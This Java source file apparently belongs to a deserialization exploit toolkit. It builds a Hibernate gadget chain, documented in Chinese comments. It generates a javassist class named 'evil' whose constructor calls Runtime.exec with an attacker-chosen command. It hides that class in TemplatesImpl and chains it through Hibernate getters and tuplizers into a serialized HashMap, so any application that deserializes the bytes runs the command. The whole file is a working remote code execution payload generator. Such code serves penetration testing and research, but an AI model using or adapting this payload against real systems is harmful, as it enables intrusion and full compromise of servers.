package top.racerz.payload;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.type.Type;
import top.racerz.utils.ReflectionUtil;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Hibernate {

    public static byte[] getPayload(String command) throws Exception {
        Class<?> componentTypeClass = Class.forName("org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");

        // TemplatesImpl 恶意字节码
        Object tmpl =  getTemplatesImpl(command);
        Method method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

        // 创建 BasicPropertyAccessor 实例，用来触发 TemplatesImpl 的 getOutputProperties
        Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        constructor.setAccessible(true);
        Object getter = constructor.newInstance(tmpl.getClass(), method, "outputProperties");

        // PojoComponentTuplizer 用来触发 BasicPropertyAccessor实例的 getter方法
        Object tup = ReflectionUtil.createWithoutConstructor(pojoComponentTuplizerClass);
        // 触发过程在其父类当中，需要其父类的 getter 数组
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tup, getters);

        // 创建 ComponentType 实例， 用来触发 PojoComponentTuplizer 的 getPropertyValues
        Object type = ReflectionUtil.createWithoutConstructor(componentTypeClass);

        // 需要用到 componentTuplizer propertySpan propertyTypes 这三个属性
        Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
        field1.setAccessible(true);
        field1.set(type, tup);

        Field field2 = componentTypeClass.getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(type, 1);

        Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
        field3.setAccessible(true);
        field3.set(type, new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来调用 ComponentType 的 getHashCode
        TypedValue typedValue = new TypedValue((Type) type, null);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "racerz");

        // put 之后再修改 typedValue 中属性 value 避免 put 时触发 gadget
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, tmpl);

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bout);
        outputStream.writeObject(hashMap);

        return bout.toByteArray();
    }

    public static TemplatesImpl getTemplatesImpl(String command) throws Exception {
        byte[][] bytes = {generate(command)};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "1");
        setFieldValue(templates, "_tfactory", null);

        return templates;
    }

    public static byte[] generate(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("evil");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\""+ command + "\");");
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    public static void setFieldValue(Object obj, String field, Object value) throws Exception {
        Field field1 = obj.getClass().getDeclaredField(field);
        field1.setAccessible(true);
        field1.set(obj, value);
    }
}
